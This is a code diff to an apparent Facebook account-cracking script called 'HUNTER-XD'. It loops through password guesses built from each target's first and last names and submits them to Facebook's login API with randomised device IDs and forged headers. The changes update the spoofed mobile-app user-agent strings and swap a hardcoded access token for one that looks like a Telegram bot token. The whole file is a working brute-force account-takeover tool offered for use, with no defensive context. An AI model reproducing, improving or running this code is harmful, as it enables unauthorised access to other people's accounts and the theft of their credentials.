@@ -337,8 +337,8 @@ def rd1(ids,passlist):
         sys.stdout.write('\r\r\033[1;37m [HUNTER-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
+                        accessToken = '8540596655:AAE0992ko3FyYevf2slNyRon4s2SSw3kn-o'
+                        ua  = "[FBAN/FB4A;FBAV/545.0.0.43.63;FBBV/866994124;FBDM/{density=3.0,width=1080,height=2292};FBLC/th_Qaau_TH;FBRV/872480009;FBCR/AIS;FBMF/INFINIX;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X670;FBSV/13;FBOP/19;FBCA/arm64-v8a:;]"
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -417,7 +417,7 @@ def api(ids,names,passlist):
                         ln = fn
                 for pw in passlist:
                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
+                        ua  = "[FBAN/FB4A;FBAV/544.0.0.42.272;FBBV/862545688;FBDM/{density=1.9125,width=720,height=1520};FBLC/en_US;FBRV/869817591;FBCR/Life Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g play - 2024;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]"
                         data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                         headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": uaa(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                         url = 'https://b-graph.facebook.com/auth/login'
@@ -472,7 +472,7 @@ def api2(ids,names,passlist):
                         ln = fn
                 for pw in passlist:
                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
+                        ua  = "[FBAN/FB4A;FBAV/543.0.0.55.73;FBBV/846638223;FBDM/{density=2.8125,width=1080,height=2340};FBLC/nl_NL;FBRV/0;FBCR/vodafone NL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S936B;FBSV/16;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/541.0.0.85.79;FBBV/835516329;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/838622447;FBCR/;FBMF/Wingtech;FBBD/T-Mobile;FBPN/com.facebook.katana;FBDV/TMRV065G;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]"
                         adid=str(uuid.uuid4())
                         device_id=str(uuid.uuid4()) 
                         data={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
@@ -531,7 +531,7 @@ def api3(ids,names,passlist):
                         ln = fn
                 for pw in passlist:
                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
+                        ua  = "[FBAN/FB4A;FBAV/525.0.0.53.51;FBBV/773514930;FBDM/{density=3.1875,width=1080,height=2340};FBLC/en_Qaau_US;FBRV/779001039;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S911U1;FBSV/15;FBOP/1;FBCA/arm64-v8a:;]"
                         headers = {
                             'Host': 'graph.facebook.com',
                             'Content-Type': 'application/x-www-form-urlencoded',
